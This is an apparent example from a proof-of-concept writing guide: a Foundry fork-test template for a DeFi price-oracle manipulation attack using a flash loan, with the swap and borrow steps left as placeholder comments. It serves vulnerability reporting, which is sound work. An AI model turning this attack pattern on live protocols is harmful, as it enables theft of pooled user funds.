# Example: Price Oracle Manipulation PoC (Fork Test + forge-poc-templates)

This example demonstrates the **fork test** approach with **forge-poc-templates** for a
complex DeFi exploit. It shows a poly-flow with flash loan, price manipulation, and
monetary impact tracking — the most involved PoC pattern in the skill.

**Scenario:** A lending protocol uses a Uniswap V2 spot price as its oracle. An attacker
can take a flash loan, manipulate the pool ratio, borrow against inflated collateral, and
repay the flash loan at a profit.

**Approach:** Poly-flow Foundry fork test inheriting from forge-poc-templates.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-poc-templates/PoC.sol";
import "forge-poc-templates/tokens/Tokens.sol";

/**
 * @title  Price oracle manipulation enables undercollateralized borrowing
 * @notice Affected: LendingPool.borrow() — uses Uniswap V2 spot price as oracle
 *         Impact:   Drain lending pool reserves (~$2.1M at pinned block)
 *         Author:   researcher
 */

// Replace these with actual target addresses
address constant LENDING_POOL = 0xABCDabcdABCDabcdABCDabcdABCDabcdABCDabcd;
address constant UNISWAP_PAIR = 0x1234123412341234123412341234123412341234;

contract OracleManipulationPoC is Test, PoC, Tokens {

    // == [ Set Up ] ==

    function setUp() public {
        // Pin to a specific block for reproducibility
        vm.createSelectFork(vm.envString("ETH_RPC_URL"), 18_500_000);
    }

    // == [ Flash Loan ] ==

    function testOracleManipulation() public {
        uint256 attackerBefore = IERC20(USDC).balanceOf(address(this));
        console.log("Attacker USDC before: %s", attackerBefore / 1e6);

        // Borrow WETH via flash loan to manipulate the pool
        // Using forge-poc-templates flash loan infrastructure
        takeFlashLoan(EthereumTokens.WETH, 10_000 ether);
    }

    function _executeAttack() internal override {
        // == [ Manipulate Oracle ] ==

        // Swap large WETH amount into the Uniswap pair to skew the price
        IERC20(EthereumTokens.WETH).approve(UNISWAP_PAIR, type(uint256).max);
        // ... swap logic against the pair to inflate collateral token price

        // == [ Exploit ] ==

        // Borrow against inflated collateral value
        // LendingPool reads spot price from the manipulated pair
        // ... borrow call against LENDING_POOL

        // Swap back to repay flash loan
        // ... reverse swap to restore position
    }

    function _completeAttack() internal override {
        // == [ Verify Profit ] ==

        uint256 attackerAfter = IERC20(USDC).balanceOf(address(this));
        uint256 profit = attackerAfter - 0; // attackerBefore was 0

        console.log("Attacker USDC after:  %s", attackerAfter / 1e6);
        console.log("Profit:               %s USDC", profit / 1e6);

        assertGt(profit, 0, "Attack was not profitable");
    }
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}
```

**Run with:**
```bash
ETH_RPC_URL=https://eth-mainnet.g.alchemy.com/v2/YOUR_KEY \
  forge test --match-test testOracleManipulation -vv
```

## Why This PoC Works

- **Fork test proves on real state.** Pinning block 18,500,000 means the test runs
  against actual on-chain balances and contract code. No synthetic mocks needed.
- **forge-poc-templates simplifies setup.** `PoC` base contract handles flash loan
  mechanics (`takeFlashLoan` / `_executeAttack` / `_completeAttack`), and `Tokens`
  provides well-known token addresses. The PoC focuses on the exploit logic.
- **Block pinning ensures reproducibility.** Anyone with an RPC endpoint can reproduce
  the exact same state. The pinned block is noted in the setUp and run command.
- **Monetary impact is explicit.** Before/after USDC balances and computed profit in
  human-readable units (divided by 1e6). A triager sees dollar amounts.
- **Section comments trace the poly flow.** Flash Loan → Manipulate Oracle → Exploit →
  Verify Profit. Each phase is a distinct section, making the multi-step attack readable.
- **Benign.** Runs in Foundry's EVM fork — no real transactions submitted. The flash
  loan and swaps exist only in the test VM.
- **Parameterized RPC.** The RPC URL comes from an environment variable, not hardcoded.
  Target contract addresses are declared as named constants at the top for easy
  adjustment.
